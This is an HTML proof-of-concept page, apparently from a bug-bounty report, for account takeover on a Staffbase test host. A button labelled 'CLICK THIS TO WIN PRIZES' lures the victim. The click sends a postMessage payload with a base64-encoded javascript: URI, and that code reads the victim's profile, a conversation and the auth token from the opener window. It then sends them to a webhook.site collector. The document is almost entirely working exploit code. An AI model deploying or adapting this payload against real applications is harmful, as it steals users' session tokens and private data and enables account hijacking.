<!DOCTYPE html>
<html>
<head><title>Staffbase ATO PoC</title></head>
<body>
    <button id="exploit" style="padding:20px; background:red; color:white; font-weight:bold;">
       CLICK THIS TO WIN PRIZES 
    </button>

    <script>
        const COLLAB = 'webhook.site/03e2e048-e7fe-4dd7-9c09-0af4f222396b';
        const TARGET = 'https://hackerone2.staffbase.rocks/content/quizcalendar/696aa79e6d79927aa7c93eff';

        document.getElementById('exploit').onclick = () => {
            const win = window.open(TARGET, '_blank');

            // The code that will be executed in the context of the new tab
            // This code reaches back into the opener (the actual Staffbase app)
            const innerCode = `
                (function(){
                    try {
                        const sb = window.opener.we;
                        if(!sb) throw new Error("we object not found on opener");
                        
                        sb.api.call('users/me', {}, {type:'GET'}).done(d => {
                            const out = {
                                profile: d,
                                authUrl: sb.authMgr?.getWebURL?.(),
                                token: sb.authMgr?.getToken?.()
                            };
                            fetch('https://${COLLAB}/?exfil=' + btoa(JSON.stringify(out)));
                        });

                        sb.api.call('conversations/6961496d4575375e9480c7f3', {}, {type:'GET'}).done(d => {
                            const out = {
                                profile: d,
                                authUrl: sb.authMgr?.getWebURL?.(),
                                token: sb.authMgr?.getToken?.()
                            };
                            fetch('https://${COLLAB}/?exfil=' + btoa(JSON.stringify(out)));
                        });
                    } catch(e) {
                        fetch('https://${COLLAB}/?error=' + btoa(e.message));
                    }
                })()
            `;

            // Wrap the code in eval(atob()) to prevent syntax breaking in the URL string
            const b64Code = btoa(innerCode);
            const finalJsUri = `javascript://hackerone2.staffbase.rocks/%0aeval(atob('${b64Code}'))`;

            const payload = [
                "INVOCATION",
                "impact_poc_final",
                "openLink",
                [finalJsUri, { inAppBrowser: false }]
            ];

            console.log("[*] Waiting 4 seconds for window/listeners to initialize...");
            setTimeout(() => {
                console.log("[+] Sending single postMessage shot...");
                
                // Target the main window
                win.postMessage(payload, '*');
                
                for (let i = 0; i < win.frames.length; i++) {
                    win.frames[i].postMessage(payload, '*');
                }
            }, 4000);
        };
    </script>
</body>
</html>
